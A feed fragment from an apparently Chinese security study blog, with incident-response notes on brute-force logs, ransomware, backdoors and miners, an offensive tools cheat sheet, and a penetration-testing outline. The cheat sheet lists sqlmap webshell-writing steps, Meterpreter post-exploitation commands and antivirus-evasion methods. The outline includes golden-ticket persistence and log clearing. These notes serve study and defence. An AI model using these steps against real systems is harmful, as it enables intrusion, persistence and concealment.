title="MongoDB暴力破解"></a>MongoDB暴力破解</h5><p>默认配置文件位置为 /etc/mongodb.conf<br>默认的的日志位置为 /var/og/mongodb/mongodb.log<br>打开verbose后能看到大量的failed事件<br>在/var/log/mongodb/mongodb.log查看</p><ol><li>登录失败的账户<pre><code>cat /var/log/mongodb/mongodb.log | grep -v &quot;UserNotFound&quot;|grep failed | awk -F &quot; &quot; &#39;&#123;print $9&#125;&#39; | sort|uniq -c|sort -nr</code></pre></li><li>登录所有账户失败的IP及次数<pre><code>cat /var/log/mongodb/mongodb.log | grep -v &quot;UserNotFound&quot;|grep failed | awk -F &quot; &quot; &#39;&#123;print $9&#125;&#39; |sort | uniq | while read line;do echo $line;cat /var/log/mongodb/mongodb.log |grep -v &quot;UserNotFound&quot; | grep failed | grep $line | awk -F &quot; &quot; &#39;&#123;print $14&#125;&#39; | cut -d &quot;:&quot; -f 1 | sort | uniq -c | sort -nr; done</code></pre></li><li>不存在账户的爆破事件<pre><code>cat /var/log/mongodb/mongodb.log | grep &quot;UserNotFound&quot;|grep failed | awk -F &quot; &quot; &#39;&#123;print $9&#125;&#39; |sort | uniq | while read line;do echo $line;cat /var/log/mongodb/mongodb.log |grep &quot;UserNotFound&quot; | grep failed | grep $line | awk -F &quot; &quot; &#39;&#123;print $14&#125;&#39; | cut -d &quot;:&quot; -f 1 | sort | uniq -c | sort -nr; done</code></pre></li></ol><h5 id="SMTP暴力破解"><a href="#SMTP暴力破解" class="headerlink" title="SMTP暴力破解"></a>SMTP暴力破解</h5><p>SMTP负责发，POP3、IMAP负责收，POP3协议客户端收到邮件，服务器端就会将其删除，除非有特殊的配置。<br>IMAP则弥补了这一缺陷，客户端该收收，服务端还给你保存着，同时你在客户端的各种配置操作都会在服务器上进行同步</p><pre><code>验证失败的账户IPcat /var/log/mail.log | grep &quot;authentication failed&quot; | grep -Po &#39;(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|[1-9])(\.(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|\d))&#123;3&#125;&#39; |sort|uniq -c|sort -nr</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h5&gt;&lt;p&gt;暴力破解一般针对&lt;br&gt;ssh、mysql、ftp、redis、mongodb、smtp&lt;/p&gt;
&lt;h5 id=&quot;SSH暴力破解&quot;&gt;&lt;a h</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>勒索病毒排查</title>
    <link href="https://liu1272.github.io/2023/08/15/%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E6%8E%92%E6%9F%A5/"/>
    <id>https://liu1272.github.io/2023/08/15/%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E6%8E%92%E6%9F%A5/</id>
    <published>2023-08-15T07:37:00.000Z</published>
    <updated>2023-08-19T09:16:04.607Z</updated>
    
    <content type="html"><![CDATA[<h5 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h5><p>正常情况下遇到勒索病毒就两种方法，要么找办法解开要么给钱。</p><h5 id="处置方法"><a href="#处置方法" class="headerlink" title="处置方法"></a>处置方法</h5><ol><li>查找勒索病毒特征，收集相关信息</li><li>深信服千里目实验室公众号直接回复病毒关键字</li><li>安全响应及EDR知识赋能平台</li><li>Freebuf</li><li>淘宝、闲鱼</li></ol><h5 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h5><p><strong>有解密工具就用解密工具<br>无解密工具就交钱</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h5&gt;&lt;p&gt;正常情况下遇到勒索病毒就两种方法，要么找办法解开要么给钱。&lt;/p&gt;
&lt;h5 id=&quot;处置方法&quot;&gt;&lt;a href=&quot;#处置方法&quot; class=</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>远控后门排查</title>
    <link href="https://liu1272.github.io/2023/08/14/%E8%BF%9C%E6%8E%A7%E5%90%8E%E9%97%A8%E6%8E%92%E6%9F%A5/"/>
    <id>https://liu1272.github.io/2023/08/14/%E8%BF%9C%E6%8E%A7%E5%90%8E%E9%97%A8%E6%8E%92%E6%9F%A5/</id>
    <published>2023-08-14T03:10:00.000Z</published>
    <updated>2023-08-19T09:15:58.132Z</updated>
    
    <content type="html"><![CDATA[<h5 id="获取事件告警信息"><a href="#获取事件告警信息" class="headerlink" title="获取事件告警信息"></a>获取事件告警信息</h5><p>监控EDR、态势感知、防火墙等平台查看威胁告警以及日志。</p><h5 id="定位后门文件"><a href="#定位后门文件" class="headerlink" title="定位后门文件"></a>定位后门文件</h5><pre><code>根据告警信息定位后门文件位置，查找进程pidlsof | grep xxxx.xxlsof /root/xxxx.xxfuser /root/xxxx.xx</code></pre><h5 id="查看外连事件详情"><a href="#查看外连事件详情" class="headerlink" title="查看外连事件详情"></a>查看外连事件详情</h5><pre><code>根据五元组来查找通信的端口ip对应的pidnetstat -pantu | grep 114.114.114.114netstat -pantu | grep 65533lsof -i:65533netstat -pantu | grep 65533lsof -i:65533</code></pre><h5 id="查找进程信息"><a href="#查找进程信息" class="headerlink" title="查找进程信息"></a>查找进程信息</h5><pre><code>查找进程相关文件lsof -p 1234   （需要root权限）pwdx获取pid程序详细信息lsof -p pidpwdx pidsystemctl status pidcat /proc/pid/mapsls -al /proc/pid/exe</code></pre><h5 id="根据pid查看对应线程"><a href="#根据pid查看对应线程" class="headerlink" title="根据pid查看对应线程"></a>根据pid查看对应线程</h5><pre><code>ps H -T -p pidps -aLf pidpstree -agplU（推荐使用）</code></pre><h5 id="确定进程运行时间"><a href="#确定进程运行时间" class="headerlink" title="确定进程运行时间"></a>确定进程运行时间</h5><pre><code>ps -eo pid,lstart,etime,cmd | grep &lt;pid&gt;</code></pre><h5 id="比对恶意文件的创建时间"><a href="#比对恶意文件的创建时间" class="headerlink" title="比对恶意文件的创建时间"></a>比对恶意文件的创建时间</h5><pre><code>stat xxx.xxls -al xxx.xx</code></pre><h5 id="样本采集分析"><a href="#样本采集分析" class="headerlink" title="样本采集分析"></a>样本采集分析</h5><pre><code>使用SCP/Xshell等将样本移出主机，计算哈希值后到威胁情报平台中去搜索certutil -hashfile 文件 MD5</code></pre><h5 id="进程查杀"><a href="#进程查杀" class="headerlink" title="进程查杀"></a>进程查杀</h5><pre><code>【查找子进程】ps ajfxsystemctl status【杀死进程】kill -9 pid   （这样子是杀不死子进程的！！！）kill -9 -pid   （杀掉进程组）</code></pre><h5 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h5><pre><code># 查看文件占用，解除占用后删除lsof xxxx.xx# 移除 i, a 属性chattr -ia file.sh# 查看是否移除成功lsattr file.sh# 移除文件rm -rf file.sh# 奇怪文件名无法删除，先查inode再删除ls -li xxxx.xxfind ./* -inum 12327526 -deletefind ./ -inum 12327526 -exec rm &#123;&#125; \;find ./* -inum 12327526 -exec rm -i &#123;&#125; \;find ./* -inum 12327526 -exec rm -f &#123;&#125; \;find ./* -inum 12327526 |xargs rm -frm `find ./* -inum 12327526`# 目录挂载无法删除（Device or resource busy）sudo lsblk -asudo umount /dev/sdb1rm -rf xxxx.xx</code></pre><h5 id="补充：守护进程"><a href="#补充：守护进程" class="headerlink" title="补充：守护进程"></a>补充：守护进程</h5><pre><code># 守护进程是什么？其他进程都是在用户登录或运行程序时创建，在运行结束或用户注销时终止，但系统服务进程（守护进程）不受用户登录注销的影响，它们一直在运行着。# 守护进程的本质是什么？（1）守护进程的本职就是孤儿进程，该进程自成会话，自成进程组，一般守护进程与终端无关；（即：pid=sid=gid）（2）后台进程受用户登录注销的影响，而守护进程不受用户登录和注销的影响。但是它们都受关机的影响。# 守护进程有什么特点？1. 没有控制终端，终端名设置为？号2. 父进程不是用户创建的进程，一般由init进程或者systemd（pid=1）的进程为父进程3. 进程名字通常以字母 d 结束4. 工作目录为/（根），主要是为了防止占用磁盘导致无法卸载磁盘5. 以kthreadd内核进程创建的守护进程以kthreadd为父进程# 守护进程如何设置？1. 执行一个fork()，之后父进程退出，子进程继续执行。2. 子进程调用setsid()开启一个新回话并释放它与控制终端之间的所有关联关系。3. 在setsid()调用之后执行第二个fork()，让父进程退出并让孙进程继续执行。确保了子进程不会成为会话组长。（根据System V中获取终端的规则，进程永远不会重新请求一个控制终端。多一个fork()调用不会带来任何坏处。）4. 使用  umask(0);  清除进程的umask以确保当daemon创建文件和目录时拥有所需的权限。5. 修改进程的当前工作目录，通常会改为根目录（/）。6. 关闭daemon从其父进程继承而来的所有打开着的文件描述符。# 守护进程如何删除？1. 首先ps axj | grep 守护进程名字，找到相应的守护进程，然后使用kill -9 守护进程名杀掉；2. 利用ps -ef命令查找相应的守护进程，再用kill -9命令将其杀死；3. 创建shell脚本对进程的启动、关闭、重启进行自动管理。注：kill -9 -pid   （杀掉进程组）</code></pre><h5 id="补充：screen的原理"><a href="#补充：screen的原理" class="headerlink" title="补充：screen的原理"></a>补充：screen的原理</h5><ul><li>当用户启动Screen时，它会创建一个守护进程作为后台进程，并与用户终端会话（称为控制终端）分离。</li><li>控制终端不再直接处理用户输入和输出，而是由Screen守护进程负责接收和处理。</li><li>守护进程通过与Unix域套接字进行通信，与控制终端保持连接。</li><li>用户在控制终端中输入的命令会被发送到守护进程，并由守护进程解析和执行。</li><li>守护进程还负责从虚拟终端读取输出内容，并将其发送回控制终端进行显示。</li></ul><p>通过这种方式，Screen实现了在控制终端与守护进程之间的交互，并通过守护进程来管理多个虚拟终端、处理窗口切换、保存会话状态等功能。<br>需要注意的是，虽然Screen的守护进程在后台运行，但用户仍然可以通过重新连接到控制终端来恢复与之前会话的交互，即使之前的SSH连接断开或终端关闭。这是Screen的一个重要特性，允许用户在断开连接后恢复他们的工作环境。</p><h5 id="补充：恢复守护进程会话的交互"><a href="#补充：恢复守护进程会话的交互" class="headerlink" title="补充：恢复守护进程会话的交互"></a>补充：恢复守护进程会话的交互</h5><p>可以使用<code>nohup</code>命令启动一个守护进程，并将输出重定向到文件中，例如：</p><pre class="line-numbers language-shell"><code class="language-shell">nohup ./your_daemon &<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>通过这种方式启动的守护进程不会因为用户退出终端而停止运行。</p><p>当用户重新连接到控制终端时，可以使用<code>jobs</code>命令查看守护进程的状态，并使用<code>fg</code>命令将其调至前台，恢复与之前会话的交互。例如：</p><pre class="line-numbers language-shell"><code class="language-shell">jobsfg %job_id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>其中，<code>job_id</code>是守护进程的作业号，可以在<code>jobs</code>命令的输出中找到。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;获取事件告警信息&quot;&gt;&lt;a href=&quot;#获取事件告警信息&quot; class=&quot;headerlink&quot; title=&quot;获取事件告警信息&quot;&gt;&lt;/a&gt;获取事件告警信息&lt;/h5&gt;&lt;p&gt;监控EDR、态势感知、防火墙等平台查看威胁告警以及日志。&lt;/p&gt;
&lt;h5 id=&quot;定位后门文</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>挖矿事件排查</title>
    <link href="https://liu1272.github.io/2023/08/13/%E6%8C%96%E7%9F%BF%E4%BA%8B%E4%BB%B6%E6%8E%92%E6%9F%A5/"/>
    <id>https://liu1272.github.io/2023/08/13/%E6%8C%96%E7%9F%BF%E4%BA%8B%E4%BB%B6%E6%8E%92%E6%9F%A5/</id>
    <published>2023-08-13T08:51:00.000Z</published>
    <updated>2023-08-19T09:15:50.374Z</updated>
    
    <content type="html"><![CDATA[<h5 id="第一步：获取信息"><a href="#第一步：获取信息" class="headerlink" title="第一步：获取信息"></a>第一步：获取信息</h5><ul><li>下线服务器之后从DNS服务器、防火墙、态势感知平台等地方获取到攻击事件详细信息</li><li>根据上传来源的IP/域名，在威胁情报平台查询确定木马类型</li><li>获取异常进程的pid</li></ul><pre><code>CPU占用：top -c -o %CPUps -eo pid,ppid,%mem,%cpu,cmd --sort=-%cpu | head -n 5内存占用：top -c -o %MEMps -eo pid,ppid,%mem,%cpu,cmd --sort=-%mem | head -n 5网络占用：安装后使用nethogs或者jnettop进行查询根据进程名或字符串查询：pidof &quot;name&quot;ps -aux | grep &quot;name&quot;ps -ef | grep &quot;name&quot; | grep -v grep | awk &#39;&#123;print $2&#125;&#39;pgrep -f &quot;name&quot;</code></pre><ul><li>根据pid查询详细信息（当查询不到时有可能是/proc/pid隐藏了）</li></ul><pre><code>lsof -p pidpwdx pidsystemctl status pidcat /proc/pid/mapsls -al /proc/pid/exe</code></pre><ul><li>根据pid查看对应线程</li></ul><pre><code>ps H -T -p pidps -aLf pidpstree -agplU（推荐使用）</code></pre><ul><li>确定进程运行时间</li></ul><pre><code>ps -eo pid,lstart,etime,cmd | grep &lt;pid&gt;</code></pre><ul><li>比对恶意文件的创建时间</li></ul><pre><code>stat xxx.xxls -al xxx.xx</code></pre><ul><li>样本采集分析</li></ul><pre><code>使用SCP/Xshell等将样本移出主机，计算哈希值后到威胁情报平台中去搜索certutil -hashfile 文件 MD5</code></pre><ul><li>进程查杀</li></ul><pre><code>【查找子进程】ps ajfxsystemctl status【杀死进程】kill -9 pid   （这样子是杀不死子进程的！！！）kill -9 -pid   （杀掉进程组）</code></pre><ul><li>删除文件</li></ul><pre><code># 查看文件占用，解除占用后删除lsof xxxx.xx# 移除 i, a 属性chattr -ia file.sh# 查看是否移除成功lsattr file.sh# 移除文件rm -rf file.sh# 奇怪文件名无法删除，先查inode再删除ls -li xxxx.xxfind ./* -inum 12327526 -deletefind ./ -inum 12327526 -exec rm &#123;&#125; \;find ./* -inum 12327526 -exec rm -i &#123;&#125; \;find ./* -inum 12327526 -exec rm -f &#123;&#125; \;find ./* -inum 12327526 |xargs rm -frm `find ./* -inum 12327526`# 目录挂载无法删除（Device or resource busy）sudo lsblk -asudo umount /dev/sdb1rm -rf xxxx.xx</code></pre><ul><li>网页挖矿排查</li></ul><pre><code># 浏览器查看历史记录，定位到该事件点访问的页面# 进入虚拟机进行访问，并限制进程只允许占用一个cpu# 查看该网页的源码和网络链接调用# 将浏览器缓存文件进行检测（大多数是JS）# 清除浏览数据&gt;清除缓存文件# 解密恶意文件查看矿池地址以及连接条件# 上区块链网站溯源</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;第一步：获取信息&quot;&gt;&lt;a href=&quot;#第一步：获取信息&quot; class=&quot;headerlink&quot; title=&quot;第一步：获取信息&quot;&gt;&lt;/a&gt;第一步：获取信息&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;下线服务器之后从DNS服务器、防火墙、态势感知平台等地方获取到攻击事件详细信息&lt;</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>安全工具</title>
    <link href="https://liu1272.github.io/2023/08/12/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    <id>https://liu1272.github.io/2023/08/12/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/</id>
    <published>2023-08-12T02:51:00.000Z</published>
    <updated>2023-08-12T04:38:48.589Z</updated>
    
    <content type="html"><![CDATA[<h5 id="Nmap常用命令"><a href="#Nmap常用命令" class="headerlink" title="Nmap常用命令"></a>Nmap常用命令</h5><pre><code>nmap hostname/ip或者多个ip或者子网192.168.123.*-iL ip.txt 扫描ip.txt的所有ip-A 包含了-sV，-O，探测操作系统信息和路由跟踪（激烈扫描，一般不用）-O 探测操作系统信息-sV 查找主机服务版本号-sA 探测该主机是否使用了包过滤器或防火墙（建议使用wafw00f）-sS 半开扫描，一般不会记入日志，不过需要root权限。-sT TCP connect扫描，这种方式会在目标主机的日志中记录大批的链接请求以及错误信息。-sP ping扫描，一般最好不加，因为有的主机会禁止ping，却实际存在。-Pn 扫描之前不使用ping，适用于防火墙禁止ping，比较有用。-sN TCP空扫描-F 快速扫描-p 指定端口/端口范围-oN 将报告写入文件-v 详细信息-T&lt;0-5&gt; 设定速度使用脚本：--script all 使用所有脚本--script=sql.injection.nse sql注入--script=&quot;smb*&quot; 扫smb系列一、4 大功能：分别为主机发现（参数-sn）、端口扫描(-sS -sU)、版本侦测(–sV)、OS侦测(-O)二、扫描方式有：tcp connect()、TCP SYN scanning、TCP FIN scanning、Nullscan等三、绕过 ping 扫描参数为：nmap -Pn XXX.XXX.XXX.XXX四、漏洞检测可直接 nmap 目标 --script=auth,vuln</code></pre><h5 id="SQLmap"><a href="#SQLmap" class="headerlink" title="SQLmap"></a>SQLmap</h5><pre><code>-u 单个URL -m xx.txt 多个URL-d &quot;mysql://user:password@10.10.10.137:3306/dvwa&quot; 作为服务器客户端，连接数据库--data post/get都适用-p 指定扫描的参数-r 读取文件-f 指纹信息--tamper 混淆脚本，用于应用层过滤--cookie --user-agent --host 对http头的修改--threads 并发线程，默认为1--dbms MySQL&lt;5.0&gt; 指定数据库或版本–level=LEVEL 执行测试的等级（1-5，默认为 1）–risk=RISK 执行测试的风险（0-3，默认为 1） Risk升高可造成数据被篡改等风险–current-db 获取当前数据库名称–dbs 枚举数据库管理系统数据库–tables 枚举 DBMS 数据库中的表–columns 枚举 DBMS 数据库表列-D DB 要进行枚举的数据库名-T TBL 要进行枚举的数据库表-C COL 要进行枚举的数据库列-U USER 用来进行枚举的数据库用户常用的tamper：base64encode.py 转为b64编码charencode.py url编码chardoubleencode.py 双URL编码unmagicquotes.py 宽字节randomcomments.py 用`/**/`分割SQL关键字space2plus.py space2comment.py space2xxxx.py 替换空格为xxPost注入：sqlmap -r &quot;数据包地址&quot; -p &quot;参数&quot; -dbms 数据类型Get注入：sqlmap -u &quot;注入点地址&quot; --dbms 参数sqlmap进行交互式写shell：1-前提条件：最高权限、知道web网站绝对路径、能获取到cookie2-sqlmap.py -u &quot;注入点地址&quot; --cookie=&quot;cookie值&quot; --os-shell-echo “一句话木马”&gt;网站的绝对路径3-输入web网站的绝对路径4-传木马</code></pre><h5 id="菜刀、蚁剑、冰蝎、CS、哥斯拉"><a href="#菜刀、蚁剑、冰蝎、CS、哥斯拉" class="headerlink" title="菜刀、蚁剑、冰蝎、CS、哥斯拉"></a>菜刀、蚁剑、冰蝎、CS、哥斯拉</h5><p><strong>菜刀特征</strong><br>使用了base64的方式加密了发送给“菜刀马”的指令，其中的两个关键payload <code>z1</code>和<code>z2</code>，这个名字是可变的</p><p><strong>蚁剑特征</strong><br>默认的USER-agent请求头是<code>antsword xxx</code>，但是可以修改<code>/modules/request.js</code>文件<br>其中流量最中明显的特征为<code>@ini_set(&quot;display_errors&quot;,&quot;0&quot;);</code>这段代码基本是所有WebShell客户端链接PHP类WebShell都有的一种代码<br>蚁剑混淆加密后还有一个比较明显的特征,即为参数名大多以<code>“_0x......=”</code>这种形式（下划线可替换），所以以_0x开头的参数名也很可能就是恶意流量</p><p><strong>冰蝎</strong><br>看包没有发现什么特征，但是可以发现它是POST请求的</p><ol><li>Accept头有<code>application/xhtml+xmlapplication/xmlapplication/signed-exchange</code>属于弱特征（UA头的浏览器版本很老）</li><li>特征分析<code>Content-Type: application/octet-stream</code>这是一个强特征，查阅资料可知octet-stream的意思是，只能提交二进制，而且只能提交一个二进制，如果提交文件的话，只能提交一个文件,后台接收参数只能有一个，而且只能是流（或者字节数组），所以很少使用</li></ol><p><strong>冰蝎2特征</strong><br>默认Accept字段的值很特殊,而且每个阶段都一样冰蝎内置了十余种UserAgent，每次连接shell会随机选择一个进行使用，但是可以在burp中修改ua头。<br><code>Content-Length: 16</code>, 16就是冰蝎2连接的特征</p><p><strong>冰蝎3特征</strong><br>目前很多waf等设备都做了冰蝎2的流量特征分析，所以3取消了动态密钥获取；抓包没有发现什么特征，但它是POST请求的</p><ol><li>Accept头<code>application/xhtml+xmlapplication/xmlapplication/signed-exchange</code>属于弱特征</li><li>ua头该特征属于弱特征，通过burp可以修改。冰蝎3.0内置的默认16个userAgent都比较老，也可以作为waf规则特征</li></ol><p><strong>哥斯拉特征</strong><br>【PHP连接特征】</p><ol><li>使用了php_XOR_BASE64</li><li>请求都含有”pass=”<br>【jsp连接特征】</li><li>使用了java_AES_BASE64</li><li>是用了java_AES_RAW</li><li>与php请求一样都含有<code>&quot;pass=&quot;</code>而且发起连接时服务器返回的Content-Length是0</li></ol><h5 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h5><p>过滤 ip:<br>过滤源 ip 地址:ip.src==1.1.1.1;,目的 ip 地址:ip.dst==1.1.1.1;<br>过滤端口:<br>过滤 80 端口:tcp.port==80,源端口:tcp.srcport==80,目的端<br>口:tcp.dstport==80<br>协议过滤:<br>直接输入协议名即可,如 http 协议 http<br>http 模式过滤:<br>过滤 get/post 包 http.request.mothod==”GET/POST”</p><h5 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h5><pre><code>常用命令：background  让meterpreter处于后台模式sessions -i number  与会话进行交互，number表示第n个sessionquit  退出会话shell  获得命令行cat  c:\\boot.ini 查看文件内容getwd  查看当前工作目录work directory upload /root/Desktop/netcat.exe c:\\   上传文件到目标机上download 0xfa.txt /root/Desktop/   下载文件到本机上edit c:\\boot.ini   编辑文件search -d d:\\www -f web.config  查找文件ps  查看当前活跃进程migrate pid  将Meterpreter会话移植到进 程数位pid的进程中execute -H -i -f cmd.exe  创建新进程getpid  获取当前进程的pid kill pid  杀死进程getuid  查看权限sysinfo  查看目标机系统信息，如机器名，操作系统等getsystem  提权操作timestompc:/a.doc -c &quot;10/27/2015 14:22:11&quot;  修改文件的创建时间迁移进程：- meterpreter &gt; ps- 自行选择PID- meterpreter &gt; migrate pid</code></pre><h4 id="一些免杀的了解"><a href="#一些免杀的了解" class="headerlink" title="一些免杀的了解"></a>一些免杀的了解</h4><p><strong>做免杀的原理：</strong><br>就是fuzz定位出被查杀的语句，然后对被查杀那部分进行加密、编码、动态执行、拆分拼接、特定条件执行等等。</p><p><strong>免杀分类：</strong><br>为静态免杀（单纯看hash值）、流量免杀（有通信流量就杀）、内存免杀（看内存运行特征）、动态免杀（行为感知）</p><p><strong>免杀语言分类：</strong></p><ol><li>编译型语言，编译器一次性将所有源代码编译为一个不可跨平台执行的可执行程序，一次编译可以重复执行（C、C++、Golang、汇编等）</li><li>解释型语言，使用解释器一边执行一边转换，不会生成可执行程序。（JavaScript、Python、PHP、Shell等）</li></ol><p><strong>免杀方法：</strong></p><ol><li>修改特征码，猜测杀软对哪几个字节进行查杀，再对应修改（几乎没用了）</li><li>shellcode加载器，改变加载到内存的方式和加密方式（主流）</li><li>反射dll加载，把dll加密，远程下载到内存中再解密执行（高级）</li></ol><h5 id="无文件执行木马的方式有哪些？"><a href="#无文件执行木马的方式有哪些？" class="headerlink" title="无文件执行木马的方式有哪些？"></a>无文件执行木马的方式有哪些？</h5><p>powershell（脚本解析器） 》》》powershell.exe（应用程序）<br>VB.script（脚本解析器） 》》》cscript.exe（应用程序）<br>bat处理 （脚本解析器） 》》》cmd.exe（应用程序）<br>javaSrtipt（脚本解析器） 》》》mshta.exe（应用程序）</p><h5 id="怎么做shellcode免杀？"><a href="#怎么做shellcode免杀？" class="headerlink" title="怎么做shellcode免杀？"></a>怎么做shellcode免杀？</h5><ol><li>编码</li><li>加壳</li><li>混淆</li><li>分离免杀</li><li>特征码修改</li><li>添加无用逻辑语句</li><li>重写api</li></ol><h5 id="分离免杀怎么做？"><a href="#分离免杀怎么做？" class="headerlink" title="分离免杀怎么做？"></a>分离免杀怎么做？</h5><p>分为加载器和shellcode两部分，一般将shellcode存储在网页或者图片中，然后加载器远程加载存在shellcode的网页或者图片之类的</p><h5 id="powershell怎么远程加载？"><a href="#powershell怎么远程加载？" class="headerlink" title="powershell怎么远程加载？"></a>powershell怎么远程加载？</h5><p>可以远程加载mimikazt，远控文件，exe可执行文件实现无文件落地。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;Nmap常用命令&quot;&gt;&lt;a href=&quot;#Nmap常用命令&quot; class=&quot;headerlink&quot; title=&quot;Nmap常用命令&quot;&gt;&lt;/a&gt;Nmap常用命令&lt;/h5&gt;&lt;pre&gt;&lt;code&gt;nmap hostname/ip或者多个ip或者子网192.168.123.</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透</title>
    <link href="https://liu1272.github.io/2023/08/06/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    <id>https://liu1272.github.io/2023/08/06/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</id>
    <published>2023-08-06T05:13:00.000Z</published>
    <updated>2023-08-12T02:48:34.062Z</updated>
    
    <content type="html"><![CDATA[<h5 id="内网渗透的流程"><a href="#内网渗透的流程" class="headerlink" title="内网渗透的流程"></a>内网渗透的流程</h5><ol><li>从外网拿下一个主机当做跳板</li><li>用<code>net user /domian</code>命令查看跳板机是否在域内，探测存活主机</li><li>提权、提取hash</li><li>进行横向移动，定位dc位置</li><li>查看是否有能直接提权域管的漏洞，拿到dc控制权后进行提权</li><li>最后制作黄金票据做好维权，清理日志</li></ol><h5 id="内网渗透的一些基础概念"><a href="#内网渗透的一些基础概念" class="headerlink" title="内网渗透的一些基础概念"></a>内网渗透的一些基础概念</h5><table><thead><tr><th>简写</th><th>全称</th><th>描述</th></tr></thead><tbody><tr><td>DC</td><td>Domain Controller</td><td>域控</td></tr><tr><td>KDC</td><td>Key Distribution Center</td><td>秘钥分发中心</td></tr><tr><td>AD</td><td>Account Database</td><td>账户数据库</td></tr><tr><td>ST</td><td>Service Tickets</td><td>ST服务票据，由TGS服务发送</td></tr><tr><td>AS</td><td>Authentication Server</td><td>身份验证服务，认证用户的身份，并为其发放TGT的服务</td></tr><tr><td>AP</td><td>Application Server</td><td>提供用户所需的服务</td></tr><tr><td>TGS</td><td>Ticket Granting Server</td><td>票据授予发放服务</td></tr><tr><td>TGT</td><td>Ticket Granting Ticket</td><td>TGT认证票据，由AS服务发放，存储在内存，默认有效期为10小时</td></tr><tr><td>黄金票据</td><td>Golden Ticket</td><td>使用域账号krbtgt的NTLM Hash进行加密</td></tr><tr><td>白银票据</td><td>Silver Ticket</td><td>使用服务账户的NTLM Hash进行加密</td></tr></tbody></table><h5 id="socket通信与代理"><a href="#socket通信与代理" class="headerlink" title="socket通信与代理"></a>socket通信与代理</h5><p><strong>两台计算机间的通信</strong>，其实是两台计算机中应用程序（进程）与应用程序（进程）间的通信。但“IP地址”仅能定位到计算机，如何定位到应用程序（进程）呢？答案是“协议+端口”。<br>如果你对同源策略有所了解就能马上反应过来，这就是IP + 协议 + 端口<br><strong>Socket</strong> 就是一个类，封装了许多功能函数，当需要建立连接进行通信时，它会先进行初始化，然后通过内置的功能函数建立连接并完成通信（打开、读/写IO、关闭），其中就包含了TCP的三次握手。<br><strong>正向代理和反向代理</strong>本质上并无区别，正向代理即客户端代理，代理客户端，服务端不知道实际发起请求的客户端。反向代理即服务端代理，代理服务端，客户端不知道实际提供服务的服务端。<br>正向代理可以隐藏用户的信息，并能够将其作为跳板访问我们无法访问的资源，如翻墙。反向代理可以隐藏服务器的信息，保障了内网的安全，同时能够用来实现负载均衡。（负载均衡也是防御DOS攻击的一种方式）<br>在<strong>地址转换与端口映射</strong>中，<code>静态NAT</code>是路由器上手动配置，一个内网地址和一个公网地址相关联，一一对应。<code>动态NAT</code>是路由器上配置一个公网IP地址池，当内网地址访问外网时从地址池里获取公网IP进行映射。当公网IP地址池分配完时，只能等待被占用的公网IP被释放后，其他主机才能获取公网IP访问公网。这种将源地址进行转换的方式也可称之为 SNAT（源地址转换）。<code>NAPT 网络地址端口转换</code>是允许多个内网地址映射到同一个公网IP的不同端口。这种将源地址和端口进行转换的方式也可称之为 SNAPT（源地址端口转换）。<br><strong>端口转发</strong>，有时被叫做隧道，是安全壳（SSH）为网络安全通信使用的一种方法。在内网中，是没有办法直接访问外网的。但是我们可以通过路由器的NAT方式访问外网。<br><strong>内网穿透</strong>是当想要访问内部网络但又没有权限去操作防火墙做端口映射的情况的时候，就需要搭建一条隧道来做端口转发和流量转发。<br><strong>正向socks</strong>：当一个机器同时存在内外网IP时就能在外网通过正向连接去访问其它内网机器，而且这里跳板机就相当于正向代理。因为对于攻击者来说它是可知的，而对于内网机来说，它们并不知道它们返回给跳板机的响应又被发送给了攻击者。<br><a href="https://smms.app/image/iTNEZ9mCukscY68" target="_blank"><img src="https://s2.loli.net/2023/08/06/iTNEZ9mCukscY68.png" 